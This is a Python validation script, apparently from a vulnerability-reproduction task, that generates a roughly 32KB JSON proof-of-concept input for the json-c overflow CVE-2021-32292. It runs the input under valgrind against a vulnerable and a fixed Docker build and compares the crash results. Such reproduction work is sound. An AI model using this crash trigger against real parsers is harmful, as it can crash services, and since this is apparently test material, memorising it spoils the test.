import subprocess
import os
import sys

def generate_poc():
    print("[*] Generating PoC targeting buf[start_pos + parse_end] overflow...")
    # El buffer es de 32768 bytes. Necesitamos que parse_end alcance ese límite.
    # Una cadena JSON plana de ~32KB debería hacerlo.
    payload = '{"key": "' + ("A" * 32760) + '"}'
    with open("manual_seed.json", "w") as f:
        f.write(payload)
    print(f"    Created manual_seed.json ({len(payload)} bytes)")

def run_target(service_name):
    print(f"\n[*] Testing {service_name}...")
    cmd = [
        "docker", "compose", 
        "-f", "tasks/CVE-2021-32292_jsonc/compose.yml",
        "run", "--rm", 
        "-v", f"{os.getcwd()}/manual_seed.json:/input/seed.bin",
        service_name,
        "valgrind", "--leak-check=no", "--error-exitcode=99",
        "/usr/local/bin/json_parse", "/input/seed.bin"
    ]
    
    result = subprocess.run(cmd, stdout=subprocess.PIPE, stderr=subprocess.PIPE, text=True)
    code = result.returncode
    
    # Mostrar salida para debugging
    if result.stdout:
        print(f"    STDOUT: {result.stdout[:500]}")
    if result.stderr:
        print(f"    STDERR: {result.stderr[:500]}")
    
    icon = "❓"
    if code == 99:  # Valgrind detectó error
        icon = "💥 VALGRIND ERROR (likely out-of-bounds read)"
    elif code == 139:
        icon = "💥 SEGFAULT"
    elif code == 0:
        icon = "✅ OK"
    elif code == 1:
        icon = "🛡️ HANDLED"
    
    print(f"    Exit Code: {code}  {icon}")
    return code

def main():
    generate_poc()
    
    print("\n--- STARTING VALIDATION ---")
    
    c_vuln = run_target("target-vuln")
    c_fixed = run_target("target-fixed")
    
    print("\n--- RESULTS ---")
    success = False
    
    # Vulnerable: debería crashear (139) o valgrind detectar error (99)
    # Fixed: debería salir limpiamente (0 o 1)
    if (c_vuln in [139, 99]) and c_fixed not in [139, 99]:
        print("✅ SUCCESS! Vulnerable crashed/errored, Fixed handled it cleanly.")
        success = True
    elif c_vuln not in [139, 99]:
        print("❌ FAIL: Vulnerable version did NOT crash/error.")
    elif c_fixed in [139, 99]:
        print("❌ FAIL: Fixed version also crashed/errored.")
        
    sys.exit(0 if success else 1)

if __name__ == "__main__":
    main()
